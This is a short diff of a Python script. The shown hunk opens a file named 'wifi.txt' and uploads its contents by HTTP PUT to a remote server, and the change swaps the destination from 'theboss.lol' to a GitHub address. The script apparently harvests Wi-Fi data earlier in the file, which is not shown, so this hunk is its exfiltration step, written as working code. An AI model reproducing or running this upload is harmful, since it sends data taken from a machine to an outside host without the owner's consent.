@@ -49,7 +49,7 @@ with open('wifi.txt', 'w+') as fh:
 # Open file with read-only in binary so you can send via API
 with open('wifi.txt', 'rb') as fh:
     # Do put request with the data as the file
-    r = requests.put("http://theboss.lol/", data=fh)
+    r = requests.put("https://github.com/Extomvi", data=fh)
     # status code should be 200 if successful
     if r.status_code == 200:
         print('Success')
